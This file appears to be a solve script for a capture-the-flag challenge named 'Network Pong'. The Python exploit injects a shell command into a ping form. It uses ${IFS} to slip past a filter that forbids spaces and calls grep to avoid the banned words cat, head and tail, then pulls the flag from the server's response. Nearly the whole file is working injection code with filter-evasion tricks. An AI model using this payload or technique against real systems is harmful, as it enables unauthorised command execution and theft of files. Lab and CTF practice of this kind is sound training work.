#!/usr/bin/env python3
# Network Pong - spaceless command injection.
# The server runs:  bash -c "{ping,-c,1,<ip>}"  (brace expansion = word splitting)
# Filters: no spaces, and the words cat/head/tail are rejected.
# We inject a command substitution whose output is written to fd 2 (captured as
# stderr=STDOUT by the server) and printed directly. ${IFS} supplies the spaces
# that the filter forbids. ping then gets an empty host arg and exits quickly.
import os, sys, re, urllib.request, urllib.parse

# Env-driven target so `pwnmake check` can point us at the started container
# ($URL) while manual runs still accept an argv or fall back to localhost.
HOST = os.environ.get("URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:22301")
payload = "$(grep${IFS}sun${IFS}flag.txt>&2)"
url = HOST.rstrip("/") + "/?ip=" + urllib.parse.quote(payload, safe="")
html = urllib.request.urlopen(url, timeout=15).read().decode(errors="replace")
flags = re.findall(r"sun\{[^}]*\}", html)
print(flags[0] if flags else "NO FLAG FOUND\n" + html)
